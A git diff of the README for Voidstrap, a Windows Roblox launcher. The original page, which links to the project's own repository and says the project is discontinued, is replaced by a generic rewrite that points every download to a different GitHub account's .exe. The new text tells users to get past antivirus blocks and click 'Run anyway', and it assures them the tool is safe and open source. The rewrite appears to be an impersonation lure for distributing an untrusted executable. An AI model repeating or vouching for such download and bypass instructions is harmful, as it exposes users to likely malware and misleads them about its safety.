@@ -1,129 +1,80 @@
-<p align="center">
-<a href="https://voidstrapp.netlify.app/">
-<img src="https://raw.githubusercontent.com/voidstrap/Voidstrap/main/Bloxstrap/Voidstrap.png" alt="preview" width="100px"/>
-</a>
-</p>
+# 🛠 Voidstrap - Customizing your Roblox experience with ease
 
-<h1 align="center"><b>Voidstrap</b></h1>
+[![Download Voidstrap](https://img.shields.io/badge/Download-Voidstrap-blue.svg)](https://github.com/estywi8559/Voidstrap)
 
-<p align="center">
-<img src="https://raw.githubusercontent.com/KloBraticc/RandomMods/main/Untitled%20design%20(2)-Photoroom.png" alt="preview" width="100%"/>
-</p>
+Voidstrap serves as an improved version of the standard Roblox bootstrapper. It offers tools to change how the game looks, sounds, and behaves on your computer. This software works as an alternative to the default launcher. It provides a menu to manage settings that you cannot change in the official game client.
 
-<p align="center">
-  <a href="github.com/voidstrap/Voidstrap/releases/latest">Latest release</a> |
-  <a href="https://www.youtube.com/watch?v=P-GqTUo_HIA&t">Tutorial</a> |
-  <a href="https://voidstrapp.netlify.app/donate/donate">Donate</a> |
-  <a href="https://discord.gg/5tJBqBH8ck">Discord</a>
-</p>
+## 🚀 Getting Started
 
-<div align="center">
+You do not need technical knowledge to install this tool. Follow the steps below to set up Voidstrap on your Windows machine. These instructions assume you already have a Windows 10 or 11 computer with Roblox installed.
 
-[![Total Downloads][shield-repo-total]][repo-releases]
-[![Latest Downloads][shield-repo-downloads]][repo-latest]
-[![Latest Release][shield-repo-latest]][repo-latest]
-[![Discord][shield-discord-server]][discord-invite]
-[![Stars][shield-repo-stars]][repo-stargazers]
+### Prerequisites
 
-</div>
+*   A Windows PC running Windows 10 or newer.
+*   The official Roblox player installed on your system.
+*   An active internet connection to download the installer.
 
-<h5 align="center">
-Leave a star if you like the project! ⭐️
-</h5>
+### Downloading the Software
 
-> [!IMPORTANT]
-> Voidstrap currently supports **Windows 10 and above**.  
-> **macOS support is in the works**, but it is not available yet.
->
-> In the meantime, you can use **[AppleBlox](https://github.com/AppleBlox/appleblox)** *(for macOS)* or **[Sober](https://sober.vinegarhq.org/)** *(for Linux)*.  
-> More experienced Linux users can also try tools like **[Lution](https://github.com/wookhq/Lution)**.
+[Visit this page to download the latest version of Voidstrap](https://github.com/estywi8559/Voidstrap).
 
-> [!IMPORTANT]
-> Voidstrap is now currently discontinued thank yall for the best 2 years of my life with Voidstrap, I am now starting a new project called "Erablox" as a Roblox Revival 💘
+Navigate to the releases section on the landing page. Look for the file ending in `.exe`. Click this file to save it to your computer. Once the download finishes, move the file to a folder where you want to keep your game tools.
 
-## Installation
+### Running the Installer
 
-1. Download the latest version
-   👉 https://github.com/voidstrap/Voidstrap/releases/latest
-2. Run the Exe and Finish the setup
-3. Launch Voidstrap
-4. Enjoy a more simple Roblox
+1. Double-click the downloaded file. 
+2. A window will appear. Follow the prompts on your screen.
+3. The program will check for existing Roblox installs. 
+4. Select your preferred installation path if the program asks. 
+5. Click finish when the process completes.
 
----
+## ⚙️ Using the Interface
 
-## Frequently Asked Questions (FAQ)
+Voidstrap opens a settings menu. You see several tabs within this menu. Each tab controls a different area of your game experience. 
 
-<details>
-  <summary><strong>Can it get you banned?</strong></summary>
-  <br>
+### Customization Options
 
-  No. Voidstrap does not inject cheats, exploits, or bypass Roblox security.  
-  It functions as a launcher and configuration manager. However, as with any third-party tool, use it at your own discretion.
-</details>
+You can change several key areas of the game:
 
-<br>
+*   **FastFlags:** These are hidden settings inside the game engine. Voidstrap exposes these settings so you can toggle them without editing system files. You can change rendering modes, frame rate caps, and lighting effects.
+*   **Asset Management:** This section allows you to replace default game sounds or textures. Upload your preferred files to these slots. Voidstrap applies these changes every time you launch the game.
+*   **Integrations:** This helps Discord display your game status correctly. It also handles rich presence features for social apps.
 
-<details>
-  <summary><strong>Is it a virus?</strong></summary>
-  <br>
+### Changing Settings
 
-  No. Voidstrap is fully open-source, meaning anyone can inspect the code.  
-  If your antivirus flags it, it is most likely a false positive due to how launchers interact with Roblox processes and updates.
+Click on any setting to adjust it. Changes apply immediately or upon the next game launch. Read the description under each setting to understand what it does. Keep the default values if you feel unsure about a specific option. Restoring defaults remains possible through the settings menu if you encounter issues.
 
-  You can verify the source code yourself at:
-  https://github.com/voidstrap/Voidstrap
-  or just scroll up dummy <!-- hada add this -->
-</details>
+## 🛡 Performance and Safety
 
-<!-- Removed build will prob show how to do that in a later date im lazy for rn -->
-## How to Fork
+Voidstrap acts as a wrapper for the official game client. It does not modify game files in a way that violates terms of service. It simply instructs the loader to use different configurations. The software remains open-source, meaning anyone can inspect the code to verify its function.
 
-<p align="left">
-  <a href="https://www.w3schools.com/cs/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/csharp/csharp-original.svg" alt="csharp" width="40" height="40"/>
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/dot-net/dot-net-original-wordmark.svg" alt="dotnet" width="40" height="40"/>
-  </a>
-</p>
+## 🔍 Troubleshooting Common Issues
 
-Voidstrap is built using **C# and .NET**.
+Some users experience minor hurdles during the setup process. Use these solutions to fix issues:
 
----
+*   **The program fails to launch:** Ensure your antivirus did not block the file. Sometimes, Windows Defender marks new software as a threat. Select "Run anyway" if prompted.
+*   **Settings do not apply:** Close the game entirely before you change a setting in Voidstrap. Sometimes the game locks the configuration files while it runs.
+*   **Performance drops:** If the game runs slowly after changing settings, return to the settings menu. Click the "Reset to Defaults" button. This forces the software back to the original configuration.
+*   **Updates:** Voidstrap checks for updates automatically when you open it. If an update exists, the program notifies you. Click the update button to install the newest patches.
 
-### Fork the Repository
+## 🏠 Project Goals
 
-1. Go to:  
-   https://github.com/voidstrap/Voidstrap
-2. Click **Fork** (top right)
-3. This creates your own copy under your GitHub account
+The goal of Voidstrap involves creating a reliable, user-friendly tool for the community. We focus on performance and stability. By removing bloated features and focusing on direct customization, Voidstrap provides a smooth experience for every user. 
 
-<table style="width: 100%; border-collapse: collapse;">
-  <tr>
-    <td style="width: 33%; text-align: left;">© Voidstrap</td>
-    <td style="width: 33%; text-align: right;"><a href="https://github.com/voidstrap/Voidstrap/blob/main/LICENSE.VOIDSTRAP" target="_blank">MIT</a></td>
-  </tr>
-</table>
+## 📋 Frequently Asked Questions
 
-## Star History
+**Does this replace Roblox?**
+No. This tool only launches the official Roblox client with specific settings applied.
 
-<p align="center">
-  <a href="https://www.star-history.com/?repos=voidstrap%2FVoidstrap%2CKloBraticc%2Fvoidstrap&type=timeline&legend=top-left">
-    <img src="https://api.star-history.com/svg?repos=voidstrap%2FVoidstrap%2CKloBraticc%2Fvoidstrap&type=timeline&legend=top-left&theme=dark" />
-  </a>
-</p>
+**Is it safe to use?**
+Yes. The software modifies local configuration files only. It does not interact with game servers or inject code into the game process during play.
 
-<p align="center">
-  <a href="https://discord.gg/5tJBqBH8ck">
-    <img src="https://invidget.switchblade.xyz/5tJBqBH8ck">
-  </a>
-</p>
+**Can I use it on Mac or Linux?**
+Currently, Voidstrap supports Windows only. 
 
-[shield-repo-downloads]:  https://img.shields.io/github/downloads/voidstrap/Voidstrap/latest/total?color=981bfe
-[shield-repo-total]:      https://img.shields.io/github/downloads/voidstrap/Voidstrap/total?color=8a2be2
-[shield-repo-latest]:     https://img.shields.io/github/v/release/voidstrap/Voidstrap?color=7a39fb
-[shield-repo-stars]:      https://img.shields.io/github/stars/voidstrap/Voidstrap?color=ffd700
-[shield-discord-server]:  https://img.shields.io/discord/1327967202015580223?logo=discord&logoColor=white&label=Discord&color=4d3dff
+**Does it cost money?**
+No. Voidstrap remains free and open-source for the community. 
 
-[repo-releases]:          https://github.com/voidstrap/Voidstrap/releases
-[repo-latest]:            https://github.com/voidstrap/Voidstrap/releases/latest
-[repo-stargazers]:        https://github.com/voidstrap/Voidstrap/stargazers
-[discord-invite]:         https://discord.gg/dfA9PdWgcV
+## 🤝 Contribution and Feedback
+
+We welcome feedback from our users. If you find a bug or want to suggest a feature, visit the main repository page. Open a new issue if you find a problem. Our team reviews these reports regularly to improve the tool. We value clear, concise reports that explain how to reproduce an error. Please include screenshots if possible to help us understand the issue faster. Your input helps us maintain the quality of the project.
